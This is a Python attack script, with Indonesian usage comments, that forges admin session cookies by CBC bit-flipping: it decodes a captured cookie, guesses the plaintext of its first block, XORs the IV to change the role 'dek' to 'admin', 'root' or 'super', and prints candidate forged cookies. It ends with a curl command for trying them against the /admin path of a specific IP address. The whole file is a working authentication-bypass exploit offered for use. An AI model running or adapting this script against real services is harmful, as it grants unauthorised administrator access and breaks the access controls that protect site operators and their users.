#!/usr/bin/env python3
# forge_admin_cookie.py
# Cara pakai:
#   python3 forge_admin_cookie.py <original_cookie>
# contoh:
#   python3 forge_admin_cookie.py ZrbIAJe3cEmMul9A5Mxx9sp2fwyLxVgcrLDQNx1U7T4

import sys
import base64
import binascii

if len(sys.argv) != 2:
    print("Usage: python3 forge_admin_cookie.py <original_cookie>")
    sys.exit(1)

orig = sys.argv[1].strip()

# base64url decode with padding fix
def b64url_decode(s):
    s2 = s.replace('-', '+').replace('_', '/')
    padding = (-len(s2)) % 4
    s2 += '=' * padding
    return base64.b64decode(s2)

def b64url_encode(b):
    s = base64.b64encode(b).decode()
    s = s.replace('+', '-').replace('/', '_').rstrip('=')
    return s

try:
    raw = b64url_decode(orig)
except Exception as e:
    print("Error decoding cookie:", e)
    sys.exit(1)

if len(raw) != 32:
    print("Warning: raw length != 32 bytes (got {})".format(len(raw)))
    # proceed anyway if different length
iv = raw[:16]
ct = raw[16:]

print(f"[+] Original cookie decoded: {len(raw)} bytes (IV+CT).")
print("[+] IV (hex):", binascii.hexlify(iv).decode())
print("[+] CT (hex):", binascii.hexlify(ct).decode())
print()

# List of plausible plaintext block-1 guesses
# Each entry is a description and the bytes we guess the decrypted block will start with.
# We will try to replace variants of "dek" with "admin" or "admin\x00..." appropriately.
guesses = [
    # common JSON beginnings (16 bytes)
    ('{"role":"dek"', b'{"role":"dek"'),
    ('{"role":"dek",', b'{"role":"dek",'),
    ('{"user":"dek"', b'{"user":"dek"'),
    ('{"user":"dek",', b'{"user":"dek",'),
    # key=value style
    ('role=dek;...   ', b'role=dek;        '),  # pad to block
    ('role=dek;       ', b'role=dek;        '),
    ('role=dek;uid=', b'role=dek;uid=    '),
    # more compact patterns
    ('role:dek;...    ', b'role:dek;        '),
    ('dek             ', b'dek               '),
    # try prefix with username then role e.g. "user:someone;ro"
    ('user:guest;rol', b'user:guest;rol    '),
    ('{"r":"dek",'    , b'{"r":"dek",       '),
    # direct "dek" at start of block
    ('dek.............', b'dek               '),
]

# Desired replacements to try (target plaintext fragments)
targets = [
    b'admin',      # plain "admin"
    b'ADMIN',      # maybe uppercase
    b'root',       # maybe "root"
    b'super',      # or "super"
]

# Helper to pad/truncate to 16 bytes
def fit16(bs):
    if len(bs) >= 16:
        return bs[:16]
    return bs + b'\x00' * (16 - len(bs))

candidates = []

for desc, guess in guesses:
    guess_block = fit16(guess)
    for tgt in targets:
        # find location of 'dek' inside guess_block (as bytes)
        idx = guess_block.find(b'dek')
        if idx == -1:
            # try to find other common slices, else try replacing start
            # we will attempt to replace first 5 bytes with target if no 'dek' found
            idx = 0

        # construct desired block by replacing at idx
        desired = bytearray(guess_block)
        desired[idx:idx+len(tgt)] = tgt
        # ensure fits 16
        desired = fit16(bytes(desired))

        # compute new IV' = IV XOR (guess_block XOR desired)
        delta = bytes(a ^ b for a, b in zip(guess_block, desired))
        new_iv = bytes(a ^ b for a, b in zip(iv, delta))

        new_cookie = b64url_encode(new_iv + ct)
        candidates.append((desc, guess_block, tgt, new_cookie))

print("[+] Generated candidate forged cookies (try them):\n")
for i,(desc, guess_block, tgt, cookie) in enumerate(candidates):
    print(f"#{i+1} guess='{desc}' replace_with='{tgt.decode(errors='ignore')}'")
    print(cookie)
    print()

print("Done. Try each cookie with curl, e.g.:")
print("  curl -v -H \"Cookie: auth=<cookie>\" http://103.49.238.151:8000/admin")
